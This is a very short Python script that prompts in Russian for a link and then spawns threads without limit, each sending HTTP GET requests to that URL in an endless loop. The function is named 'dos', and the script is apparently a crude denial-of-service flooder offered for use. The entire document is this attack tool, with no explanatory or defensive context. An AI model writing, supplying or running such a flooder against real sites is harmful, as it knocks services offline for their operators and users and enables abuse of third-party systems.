import threading
import requests

link = input('Введите ссылочку: ')


def dos():
    while True:
        requests.get(link)


while True:
    threading.Thread(target=dos).start()